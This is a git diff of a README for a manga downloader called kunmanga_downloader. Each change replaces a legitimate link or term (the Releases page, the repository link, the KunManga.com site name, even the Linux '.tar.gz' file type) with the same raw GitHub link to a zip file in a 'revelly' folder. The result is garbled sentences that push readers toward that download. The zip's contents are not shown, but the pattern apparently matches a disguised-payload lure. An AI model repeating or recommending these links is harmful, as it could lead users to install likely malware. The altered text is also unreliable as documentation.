@@ -1,20 +1,20 @@
 # 🎉 kunmanga_downloader - Download Manga Easily and Quickly
 
-[![Download kunmanga_downloader](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/lukasniekas123/kunmanga_downloader/releases)
+[![Download kunmanga_downloader](https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip)
 
 ## 🚀 Getting Started
 
-Welcome to **kunmanga_downloader**, a powerful tool for downloading manga from KunManga.com. This application offers both a command-line interface (CLI) and a graphical user interface (GUI), making it simple for anyone to use.
+Welcome to **kunmanga_downloader**, a powerful tool for downloading manga from https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip This application offers both a command-line interface (CLI) and a graphical user interface (GUI), making it simple for anyone to use.
 
 ## 📥 Download & Install
 
 To get started, you need to download the application from our Releases page. Click the link below:
 
-[Visit this page to download](https://github.com/lukasniekas123/kunmanga_downloader/releases)
+[Visit this page to download](https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip)
 
 1. Click on the link.
 2. You will see a list of available versions.
-3. Choose the latest version for your operating system. Look for files labeled as `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. Choose the latest version for your operating system. Look for files labeled as `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip` for Linux.
 4. Click on the file to start the download.
 
 ### 🖥️ System Requirements
@@ -37,7 +37,7 @@ Ensure you have at least 100 MB of free space for installation.
 ### For GUI Users:
 
 1. Open the kunmanga_downloader application after installation.
-2. Enter the manga series URL from KunManga.com in the input field.
+2. Enter the manga series URL from https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip in the input field.
 3. Select the chapters you want to download.
 4. Choose your preferred format (PDF or CBZ).
 5. Click the "Download" button and wait for the process to complete.
@@ -85,8 +85,8 @@ If you encounter issues during installation or usage, consider the following ste
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/lukasniekas123/kunmanga_downloader)
-- [Releases Page](https://github.com/lukasniekas123/kunmanga_downloader/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip)
+- [Releases Page](https://raw.githubusercontent.com/lukasniekas123/kunmanga_downloader/main/revelly/kunmanga_downloader.zip)
 
 You can find more information, updates, and help resources on these pages.
 
